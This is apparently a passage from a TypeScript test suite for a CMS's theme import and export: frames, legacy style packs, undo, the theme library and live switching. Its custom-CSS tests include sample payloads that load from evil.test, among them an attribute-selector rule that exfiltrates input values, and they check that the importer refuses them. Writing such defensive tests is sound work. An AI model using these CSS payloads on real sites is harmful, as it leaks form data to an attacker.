    const staged = savedDrafts.get("chrome.header|")!;
    expect(staged.regions.header![1]!.edges?.bottom?.image).toBe(`themes/${META.id}/drips.png`);
    expect(staged.regions.header![1]!.edges?.bottom?.season).toEqual({ from: "10-01", to: "11-01" });
  });
});

// ── Site frame ───────────────────────────────────────────────────────────────

describe("site frame", () => {
  const boxed = (patch: Partial<SiteFrame> = {}): SiteFrame => siteFrameSchema.parse({
    mode: "boxed", maxWidth: 1200, overrides: { home: "overlap" }, ...patch,
  });

  it("exports the live frame and imports it as the theme's baseline, applied", async () => {
    frames.published = boxed();
    const exported = await themeService.exportTheme(META);
    const zip = new AdmZip(exported);
    expect(JSON.parse(zip.getEntry(THEME_PATHS.frame)!.getData().toString())).toEqual(boxed());

    frames.published = DEFAULT_SITE_FRAME;
    await putOn(exported, "user-1");
    expect(frames.theme).toEqual(boxed());
    expect(frames.applied).toEqual(boxed());
  });

  it("carries the body background image and repoints it at the unpacked file", async () => {
    await write("layouts/sky.png", PNG);
    frames.published = boxed({ background: { ...DEFAULT_SITE_FRAME.background, type: "image", image: "layouts/sky.png" } });
    const exported = await themeService.exportTheme(META);
    const zip = new AdmZip(exported);
    expect(zip.getEntry(`${THEME_PATHS.assets}sky.png`)?.getData()).toEqual(PNG);
    expect(JSON.parse(zip.getEntry(THEME_PATHS.frame)!.getData().toString()).background.image)
      .toBe("assets/sky.png");

    await putOn(exported, "user-1");
    expect(frames.applied?.background.image).toBe(`themes/${META.id}/sky.png`);
  });

  it("KEEPS a frame the admin customised, but records the new baseline", async () => {
    frames.published = boxed();
    const exported = await themeService.exportTheme(META);
    frames.customised = true;
    await putOn(exported, "user-1");
    expect(frames.theme).toEqual(boxed());
    expect(frames.applied).toBeNull();
  });

  it("a theme that ships no frame puts the site back to full width", async () => {
    // Otherwise switching away from a boxed theme would leave the site boxed.
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ ...META, minXentiumVersion: "1.0" })));
    zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
    await putOn(zip.toBuffer(), "user-1");
    expect(frames.theme).toBeNull();
    expect(frames.applied).toEqual(DEFAULT_SITE_FRAME);
  });

  it("refuses a frame outside the editor's ranges, before anything is written", async () => {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ ...META, minXentiumVersion: "1.0" })));
    zip.addFile(THEME_PATHS.frame, Buffer.from(JSON.stringify({ mode: "boxed", maxWidth: 99999 })));
    await expect(putOn(zip.toBuffer(), "user-1")).rejects.toThrow(/frame\.json is invalid/);
    expect(frames.theme).toBeNull();
    expect(frames.applied).toBeNull();
  });

  it("a tokens-only package carries no frame", async () => {
    frames.published = boxed();
    const zip = new AdmZip(await themeService.exportTheme(META, { tokensOnly: true }));
    expect(zip.getEntry(THEME_PATHS.frame)).toBeNull();
  });
});

/**
 * `.xtstyle` absorbed into `.xttheme` (2026-08-15).
 *
 * The two were never really two formats: a style pack is `manifest.json` plus a
 * `:root`-only light/dark pair, which is a strict subset of a theme package. What
 * actually differed was the paperwork — a theme manifest requires `id`, `vendor`,
 * `version` and `minXentiumVersion`, and a style pack carried only `name` — so the
 * "strict superset" this file has claimed since it was written was true of the files
 * and false of the manifest. One ingestion path now, which is the point.
 */
describe("importing a legacy .xtstyle", () => {
  /** Exactly what the old `installStylePack` accepted: name only, no theme fields. */
  function stylePack(manifest: Record<string, unknown> = { name: "Ocean" }): Buffer {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify(manifest)));
    zip.addFile(THEME_PATHS_LEGACY.cssLight, Buffer.from(":root {\n  --c-accent: #0aa;\n}\n"));
    zip.addFile(THEME_PATHS_LEGACY.cssDark, Buffer.from(":root {\n  --c-accent: #066;\n}\n"));
    return zip.toBuffer();
  }

  it("accepts one and takes its tokens", async () => {
    const report = await putOn(stylePack(), "user-1");
    expect(report.manifest.name).toBe("Ocean");
    // The fields it never had are filled in rather than demanded of it.
    expect(report.manifest.id).toBe("ocean");
    expect(report.manifest.vendor).toBe("community");
    expect(report.manifest.version).toBe("1.0.0");
    // A pack carries no pages, so it must not claim to have replaced any.
    expect(report.templates).toEqual([]);
  });

  it("keeps an explicit id or vendor instead of inventing one", async () => {
    const report = await putOn(
      stylePack({ name: "Ocean", vendor: "Acme", version: "2.3.0" }), "user-1",
    );
    expect(report.manifest.vendor).toBe("Acme");
    expect(report.manifest.version).toBe("2.3.0");
  });

  it("still refuses a real theme whose manifest is malformed", async () => {
    // The leniency is scoped to packages that are unmistakably style packs. A package
    // shipping layouts is a theme, and a theme with no id is an error, not a guess.
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Broken" })));
    zip.addFile(THEME_PATHS.css, Buffer.from(":root {}"));
    zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
    await expect(putOn(zip.toBuffer(), "user-1")).rejects.toThrow(/manifest/i);
  });

  it("holds the `:root`-only rule the old importer enforced", async () => {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Sneaky" })));
    zip.addFile(THEME_PATHS.css, Buffer.from("body { display: none; }"));
    await expect(putOn(zip.toBuffer(), "user-1")).rejects.toThrow(/root/i);
  });
});

describe("tokens-only export", () => {
  it("ships the palette and no layouts", async () => {
    const zip = new AdmZip(await themeService.exportTheme(META, { tokensOnly: true }));
    const names = zip.getEntries().map((e) => e.entryName);

    expect(names).toContain(THEME_PATHS.tokens);
    expect(names).toContain(THEME_PATHS.css);
    expect(names).toContain(THEME_PATHS.manifest);
    expect(names.some((n) => n.startsWith(THEME_PATHS.layouts))).toBe(false);
    // No layouts means nothing references an asset, so none are collected.
    expect(names.some((n) => n.startsWith(THEME_PATHS.assets))).toBe(false);
  });

  it("still carries layouts when the flag is off", async () => {
    const zip = new AdmZip(await themeService.exportTheme(META));
    expect(zip.getEntries().some((e) => e.entryName.startsWith(THEME_PATHS.layouts))).toBe(true);
  });

  it("round-trips: what it exports, it can import", async () => {
    const buf = await themeService.exportTheme(META, { tokensOnly: true });
    const report = await putOn(buf, "user-1");
    expect(report.templates).toEqual([]);
  });
});

/**
 * What a rejection actually TELLS an admin.
 *
 * Both of these were found by importing a broken package in a real browser, and
 * neither is visible from the server side: the message the API composes was being
 * thrown away and replaced before it reached the screen, and the part that survived
 * named no file and no field.
 */
/** The error a rejection produced — and a clear failure if it did not reject at all. */
async function rejectionOf(p: Promise<unknown>): Promise<Error> {
  let caught: unknown;
  let resolved = false;
  try { await p; resolved = true; } catch (e) { caught = e; }
  if (resolved) throw new Error("expected the import to be refused, but it succeeded");
  return caught as Error;
}

describe("rejections are actionable", () => {
  const brokenTheme = (): Buffer => {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Sneaky" })));
    zip.addFile(THEME_PATHS.css, Buffer.from(":root {}"));
    // A `layouts/` folder makes this a theme, so the strict manifest applies.
    zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
    return zip.toBuffer();
  };

  it("carries its OWN XEC code, not the generic validation one", async () => {
    // `XEC-API-4001` has a localized string ("Please check your input and try again"),
    // and the web client prefers a localized string over the server's message — so
    // borrowing that code silently replaced every specific reason with a generic one.
    await expect(putOn(brokenTheme(), "user-1"))
      .rejects.toMatchObject({ code: "XEC-CORE-8002", httpStatus: 422 });
  });

  it("names the fields that are wrong, not just that something is", async () => {
    // Zod's message for a missing required field is "expected string, received
    // undefined" — repeated once per absent field, which identifies nothing. The
    // PATH is the only part that says what to go and fix.
    const err = await rejectionOf(putOn(brokenTheme(), "user-1"));
    expect(err.message).toContain("id:");
    expect(err.message).toContain("vendor:");
    expect(err.message).toContain("version:");
    expect(err.message).toContain("minXentiumVersion:");
  });

  it("names the file when a layout is the problem", async () => {
    const zip = new AdmZip();
    zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ ...META, minXentiumVersion: "1.0" })));
    zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify({ templateKey: "home" , regions: { main: [{ id: "x" }] } })));
    const err = await rejectionOf(putOn(zip.toBuffer(), "user-1"));
    expect(err.message).toContain("layouts/home.json");
    expect(err.message).toMatch(/main\.0/);   // the offending node, by path
  });
});

// ── The theme's stylesheet: its own layer, staged, and hardened ──────────────
//
// Custom CSS was the one channel a theme did NOT layer. An import wrote the package's
// stylesheet into the ADMIN's keys, so importing a theme destroyed whatever CSS the
// admin had written — no baseline recorded, nowhere to recover it from. These assert
// that it now lands in the theme's own layer instead, and that a stranger's stylesheet
// cannot reach off-site or ship a reference the package does not carry.

describe("theme custom CSS", () => {
  const withCss = (files: Record<string, string | Buffer> = {}) =>
    pack({ [THEME_PATHS.custom]: ".x { color: red }", ...files });

  it("stages into the THEME layer and never touches the admin's stylesheet", async () => {
    appearance.customCss = ".mine { color: blue }";

    const report = await putOn(withCss(), "user-1");

    expect(report.customCssApplied).toBe(true);
    expect(appearance.savedThemeCustomCss).toContain(".x");
    // The admin's own stylesheet is untouched — this is the whole point.
    expect(appearance.savedCustomCss).toBeNull();
    expect(appearance.customCss).toBe(".mine { color: blue }");
  });

  it("rewrites url(assets/…) to where the file actually landed", async () => {
    // Nothing did this before, so every image a theme shipped through its stylesheet
    // resolved against /api/appearance/css and 404'd.
    const buf = pack({
      [THEME_PATHS.custom]: `.hero { background: url("assets/tile.png") }`,
      [`${THEME_PATHS.assets}tile.png`]: PNG,
    });
    await putOn(buf, "user-1");
    expect(appearance.savedThemeCustomCss)
      .toContain(`url("/uploads/themes/${META.id}/tile.png")`);
  });

  it("REFUSES @import — it fetches a stylesheet from another server", async () => {
    const buf = withCss({ [THEME_PATHS.custom]: `@import url("https://evil.test/x.css"); .a{color:red}` });
    await expect(putOn(buf, "user-1")).rejects.toThrow(/@import/);
  });

  it("REFUSES a remote url() — the exfiltration and fingerprinting vector", async () => {
    for (const bad of [
      `.a { background: url(https://evil.test/p.png) }`,
      `.a { background: url("//evil.test/p.png") }`,
      `input[value^="a"] { background: url('http://evil.test/a') }`,
    ]) {
      await expect(putOn(withCss({ [THEME_PATHS.custom]: bad }), "user-1"))
        .rejects.toThrow(/another server/);
    }
  });

  it("REFUSES a reference the package does not carry, naming it", async () => {
    const err = await rejectionOf(putOn(
      withCss({ [THEME_PATHS.custom]: `.a { background: url(assets/absent.png) }` }), "user-1",
    ));
    expect(err.message).toContain("assets/absent.png");
    expect(err.message).toMatch(/does not carry/);
  });

  it("allows data: URLs and site-absolute paths — neither can reach off-site", async () => {
    const css = `.a{background:url("data:image/gif;base64,R0lGODlhAQABAAAAACw=")}`
      + `.b{background:url(/uploads/branding/logo.png)}`;
    await putOn(withCss({ [THEME_PATHS.custom]: css }), "user-1");
    expect(appearance.savedThemeCustomCss).toContain("data:image/gif");
    expect(appearance.savedThemeCustomCss).toContain("/uploads/branding/logo.png");
  });

  it("refuses BEFORE writing anything — a rejected package leaves no assets on disk", async () => {
    // All-or-nothing, the same rule the layouts and tokens follow.
    const buf = pack({
      [THEME_PATHS.custom]: `.a { background: url(https://evil.test/p.png) }`,
      [`${THEME_PATHS.assets}tile.png`]: PNG,
    });
    await expect(putOn(buf, "user-1")).rejects.toThrow();
    await expect(fs.readdir(path.join(UPLOAD_DIR, "themes", META.id))).rejects.toThrow();
    expect(appearance.savedThemeCustomCss).toBeNull();
  });

  it("round-trips: export carries the stylesheet's images and repoints them", async () => {
    // Without this an exported stylesheet points at the SOURCE site's uploads — a broken
    // image everywhere else, and a package the importer would now refuse outright.
    await write(`themes/${META.id}/tile.png`, PNG);
    appearance.themeCustomCss = `.hero { background: url("/uploads/themes/${META.id}/tile.png") }`;
    appearance.customCss = ".mine { color: blue }";

    const zip = new AdmZip(await themeService.exportTheme(META));
    const css = zip.getEntry(THEME_PATHS.custom)!.getData().toString();

    expect(css).toContain(`url("assets/tile.png")`);
    expect(zip.getEntry(`${THEME_PATHS.assets}tile.png`)?.getData()).toEqual(PNG);
    // EFFECTIVE, not the admin layer alone: the theme's half must travel too.
    expect(css).toContain(".mine { color: blue }");

    // And what it produced is accepted back.
    await expect(putOn(zip.toBuffer(), "user-1")).resolves.toBeTruthy();
  });
});

/** The smallest package the importer accepts: one template default, no assets. */
const themePackage = (manifest?: Record<string, unknown>) => pack({
  [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(DEFAULT_LAYOUTS.home),
}, manifest);

/**
 * Undoing a theme import.
 *
 * The behaviour that makes trying a theme possible at all. Installing one restages
 * the arrangement of every page at once, and before this existed there was no way
 * back: per-template discard covers layouts only, `resetAppearance` deliberately
 * keeps the theme layer ("reset drops MY edits, it does not uninstall the theme"),
 * and nothing recorded what had been replaced. An admin could not find out what a
 * theme looked like without accepting it permanently.
 */
describe("undoing an import", () => {
  beforeEach(() => {
    for (const k of Object.keys(rollbackProbe)) delete rollbackProbe[k];
  });

  it("takes an update's undo point BEFORE the package is replaced", async () => {
    // ⚠ The ordering is the whole feature: taken after the write, the undo point would
    // capture the new version as if it were what was there before.
    await putOn(themePackage({ version: "1.0.0" }), "u1");
    const v1 = library.rows.get(META.id)!.payload;
    rollbackProbe.updating = META.id;
    await themeService.importTheme(themePackage({ version: "2.0.0" }), "u1");
    expect(rollbackProbe.saved.update.payload).toEqual(v1);
    // …and untouched layouts were released against the OLD package too.
    expect(rollbackProbe.releasedBeforeReplace).toEqual(v1);
  });

  it("records the theme it replaced, so the undo can name it", async () => {
    appearance.installed = { id: "old-theme", name: "Old Theme", version: "1.0.0" };
    await putOn(themePackage(), "u1");
    expect(rollbackProbe.saved.replaced).toBe("Old Theme");
  });

  it("undoes a SWITCH by switching back, and then drops the undo point", async () => {
    await putOn(themePackage(), "u1");                 // Core → this theme
    const res = await themeService.discardImportedTheme("u1");
    expect(res.restored).toBe(true);
    expect(appearance.installed).toBeNull();           // back on Core
    // Consumed: offering it twice would undo something already undone.
    expect(rollbackProbe.cleared).toBe(true);
  });

  it("undoes an UPDATE: the old package and that theme's own layouts come back", async () => {
    await putOn(themePackage({ version: "1.0.0" }), "u1");
    const v1 = structuredClone(library.rows.get(META.id)!.payload);
    await themeService.importTheme(themePackage({ version: "2.0.0" }), "u1");
    await themeService.discardImportedTheme("u1");
    expect(library.rows.get(META.id)!.payload).toEqual(v1);
    expect(rollbackProbe.restoredKey).toBe(META.id);
    expect(rollbackProbe.restored).toEqual(["home"]);
    expect(appearance.installed?.id).toBe(META.id);    // still the live theme
  });

  it("is a no-op, not an error, when there is nothing to undo", async () => {
    // "Nothing is staged" is a state an admin can be in, not a failure.
    const res = await themeService.discardImportedTheme("u1");
    expect(res).toEqual({ restored: false, replaced: null });
  });

  it("reports whether an undo is available", async () => {
    expect(await themeService.getRollbackState()).toMatchObject({ available: false });
    await putOn(themePackage(), "u1");
    expect(await themeService.getRollbackState()).toMatchObject({ available: true });
  });
});

/**
 * The theme LIBRARY — installed is not active.
 *
 * A site can have many themes installed and exactly one active, the same way plugins
 * work (§10/§54). Before this, a single settings key held ONE manifest, so importing
 * a second theme destroyed the first: an admin could not put two side by side and
 * choose, and going back meant finding the original `.xttheme` again.
 */
describe("the library", () => {
  beforeEach(() => {
    library.rows.clear();
    for (const k of Object.keys(rollbackProbe)) delete rollbackProbe[k];
  });

  it("keeps a theme when a DIFFERENT one is installed after it", async () => {
    // The complaint this feature answers, stated as a test.
    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");

    expect([...library.rows.keys()].sort()).toEqual(["aurora", "meadow"]);
  });

  it("marks exactly one active — the one just put on", async () => {
    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");

    expect(library.rows.get("aurora")!.active).toBe(false);
    expect(library.rows.get("meadow")!.active).toBe(true);
  });

  it("UPDATES the row when the same id is imported again", async () => {
    // An upgrade, not a second entry: the id is what a licence and an entitlement
    // point at, so two rows for one theme would be two answers to one question.
    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
    await putOn(themePackage({ id: "aurora", version: "2.0.0" }), "u1");

    expect(library.rows.size).toBe(1);
    expect(library.rows.get("aurora")!.version).toBe("2.0.0");
  });

  it("stores the payload, so a switch needs no package", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    const payload = library.rows.get("aurora")!.payload as { documents: Record<string, unknown> };
    expect(Object.keys(payload.documents)).toContain("home");
  });

  it("applies a stored theme on activate, and flips which row is active", async () => {
    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");

    await themeService.activateTheme("aurora", "u1");

    expect(library.rows.get("aurora")!.active).toBe(true);
    expect(library.rows.get("meadow")!.active).toBe(false);
    // Applied, not merely flagged: the draft carries the theme's layouts again.
    expect(appearance.savedInstalled).toMatchObject({ id: "aurora" });
  });

  it("takes a fresh undo point when switching, so a switch is reversible too", async () => {
    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");
    delete rollbackProbe.saved;

    await themeService.activateTheme("aurora", "u1");
    expect(rollbackProbe.saved).toBeTruthy();
  });

  it("refuses to activate something that is not installed", async () => {
    await expect(themeService.activateTheme("nope", "u1")).rejects.toMatchObject({ httpStatus: 404 });
  });

  it("uninstalling the ACTIVE theme falls back to Core, and takes its own edits with it", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    forgotten.length = 0;
    await themeService.uninstallTheme("aurora");
    expect(library.rows.has("aurora")).toBe(false);
    expect(appearance.installed).toBeNull();
    expect(forgotten).toEqual(["layouts:aurora", "appearance:aurora"]);
  });

  it("uninstalls one that is not active", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    await putOn(themePackage({ id: "meadow" }), "u1");
    await themeService.uninstallTheme("aurora");
    expect([...library.rows.keys()]).toEqual(["meadow"]);
  });

});

/**
 * ⚠⚠ A THEME GOES LIVE WHEN IT IS APPLIED — no publish step.
 *
 * It used to stage everything as a draft, which made activating a theme a two-step
 * action and, worse, a two-PLACE one: the layouts published from the Layout Editor
 * and the tokens and stylesheet from the Style Editor, with nothing saying so.
 *
 * Draft→publish is an EDITING affordance — batch many small edits, publish when the
 * set is coherent — and it was doing the wrong job here. Activating a theme is one
 * atomic decision, and staging it stopped buying anything once there was a real
 * preview, an undo, and a library to switch back through.
 */
describe("applying a theme is live", () => {
  beforeEach(() => {
    library.rows.clear();
    appearance.styleVersionBumps = 0;
  });

  it("publishes the theme's layouts rather than staging them", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    expect([...livePublished.keys()]).toContain("home");
  });

  it("tells every open client, over the channel that already exists", async () => {
    // The style version is what the appearance SSE carries, and layouts ride the same
    // channel — a theme that went live silently would sit unseen until a reload.
    await putOn(themePackage({ id: "aurora" }), "u1");
    expect(appearance.styleVersionBumps).toBeGreaterThan(0);
  });

  it("still writes the theme LAYER, which is what Revert to theme restores", async () => {
    // Live is not a reason to stop recording the baseline: it is what the next update
    // compares against and what an admin reverts one template to.
    await putOn(themePackage({ id: "aurora" }), "u1");
    expect(themeLayer.has("home" as TemplateKey)).toBe(true);
  });

  it("an UPDATE still leaves a customised template alone", async () => {
    // An admin who arranged a page of this theme keeps their arrangement across a
    // new version of it.
    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
    customised.add("home" as TemplateKey);
    const report = await themeService.importTheme(themePackage({ id: "aurora", version: "1.1.0" }), "u1");
    expect(report.kept).toContain("home");
    expect(livePublished.has("home")).toBe(false);
  });

  /**
   * ⚠ The theme layer is REPLACED on a switch, never merged. Tokens and the stylesheet
   * used to be written only when the incoming theme carried them, so switching from a
   * theme with a stylesheet (fonts, rules) to one without kept serving the old one —
   * found by switching a dev site from Redline back to a colours-only theme.
   */
  it("clears the previous theme's stylesheet and tokens when the next one has none", async () => {
    await putOn(pack({
      [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(DEFAULT_LAYOUTS.home),
      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-accent": "#e22b2b" } }),
      [THEME_PATHS.custom]: ".x { color: red; }",
    }, { id: "redline" }), "u1");
    expect(appearance.savedThemeCustomCss).toContain(".x");

    // Each theme carries its own stylesheet; switching changes which one is served.
    await putOn(themePackage({ id: "plain" }), "u1");
    expect(activePayload()?.customCss ?? "").toBe("");

    await themeService.activateTheme("redline", "u1");
    expect(activePayload()?.customCss).toContain(".x");
    await themeService.activateTheme("plain", "u1");
    expect(activePayload()?.customCss ?? "").toBe("");
  });

  it("goes live on a SWITCH too, not only on import", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    await putOn(themePackage({ id: "meadow" }), "u1");
    appearance.styleVersionBumps = 0;

    await themeService.activateTheme("aurora", "u1");
    expect([...livePublished.keys()]).toContain("home");
    expect(appearance.styleVersionBumps).toBeGreaterThan(0);
  });
});

/**
 * Installing is not switching.
 *
 * An import used to put the theme on the site in the same step, so installing one to
 * look at it changed the whole site. Now it lands in the library and the admin is
 * asked. The one exception is an UPDATE to the theme already being worn — "keep the
 * current theme" would then mean keeping the old version of the same theme, while the
 * library claimed the new one.
 */
describe("installing is not switching", () => {
  beforeEach(() => {
    for (const k of Object.keys(rollbackProbe)) delete rollbackProbe[k];
    library.rows.clear();
    appearance.styleVersionBumps = 0;
  });

  it("adds a new theme to the library WITHOUT touching the site", async () => {
    appearance.installed = { id: "aurora", name: "Aurora", version: "1.0.0" };
    const report = await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");

    expect(report.activated).toBe(false);
    expect(report.current).toEqual({ id: "aurora", name: "Aurora", version: "1.0.0" });
    expect(library.rows.get("meadow")!.active).toBe(false);
    // Nothing a visitor sees moved: no layout published, no layer written, no push.
    expect(livePublished.size).toBe(0);
    expect(appearance.savedInstalled).toBeNull();
    expect(appearance.styleVersionBumps).toBe(0);
    expect(rollbackProbe.saved).toBeUndefined();
  });

  it("leaves the ACTIVE row active", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");

    expect(library.rows.get("aurora")!.active).toBe(true);
    expect(library.rows.get("meadow")!.active).toBe(false);
  });

  it("asks on a stock site too — stock Xentium is a look, and `current` says so with null", async () => {
    const report = await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
    expect(report.activated).toBe(false);
    expect(report.current).toBeNull();
  });

  it("APPLIES an update to the theme the site is already wearing", async () => {
    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");

    const report = await themeService.importTheme(themePackage({ id: "aurora", version: "1.1.0" }), "u1");
    expect(report.activated).toBe(true);
    expect([...livePublished.keys()]).toContain("home");
    expect(library.rows.get("aurora")!.version).toBe("1.1.0");
  });

  it("refreshes an INACTIVE theme's row on update, still without switching", async () => {
    await putOn(themePackage({ id: "aurora" }), "u1");
    await themeService.importTheme(themePackage({ id: "meadow", version: "1.0.0" }), "u1");
    await themeService.importTheme(themePackage({ id: "meadow", version: "2.0.0" }), "u1");

    expect(library.rows.get("meadow")!.version).toBe("2.0.0");
    expect(library.rows.get("meadow")!.active).toBe(false);
    expect(library.rows.get("aurora")!.active).toBe(true);
  });

  it("the switch, when chosen, is the ordinary activate — live, with an undo point", async () => {
    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");
    await themeService.activateTheme("meadow", "u1");

    expect(library.rows.get("meadow")!.active).toBe(true);
    expect([...livePublished.keys()]).toContain("home");
    expect(rollbackProbe.saved).toBeTruthy();
  });
});
